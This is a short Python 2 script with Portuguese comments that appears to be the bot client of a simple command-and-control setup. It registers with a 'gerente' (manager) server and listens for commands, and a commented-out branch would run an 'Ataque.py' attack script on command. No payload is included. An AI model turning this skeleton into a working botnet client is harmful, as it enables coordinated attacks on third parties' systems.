import errno
from socket import *
serverName = 'DESKTOP-OOVUV0L' #Nome do meu computador na rede
serverPort = 12000
clientSocket = socket(AF_INET, SOCK_STREAM)
try:
    clientSocket.connect((serverName,serverPort))
except error, e:
    if e[0] == errno.ETIMEDOUT:
        print 'Erro ao conectar com o gerente - TIMEOUT\n'
        exit(0)
        
try:
    clientSocket.send('cli'+gethostname())
    print 'Conectado ao gerente'
except error, e:
    if e[0] == 10057:
        print 'Gerente desligado'
        exit(0)

clientPort = 12001
serverSocket = socket(AF_INET, SOCK_STREAM)
try:
    serverSocket.bind(('', clientPort))
    serverSocket.listen(1)
except error, e:
    if e[0] == 10048:
        print 'A porta de comunicacao do bot (12001) esta em uso'
        print 'Mate o processo que a utiliza para poder prosseguir'
        #TODO: fazer esse procedimento de encontrar e matar o processo que utiliza a porta 12001 automaticamente


while 1:
    try:
        connectionSocket, addr = serverSocket.accept()
        rcv = connectionSocket.recv(1024)
        print rcv

        #if rcv == 'att':
            #execfile(Ataque.py)

        if rcv == 'rem':
            exit(0)
            

    except KeyboardInterrupt, SystemExit:
        print 'fim'
        if connectionSocket:
            connectionSocket.send('off'+gethostname())       
            connectionSocket.close()
        clientSocket.close()
        break
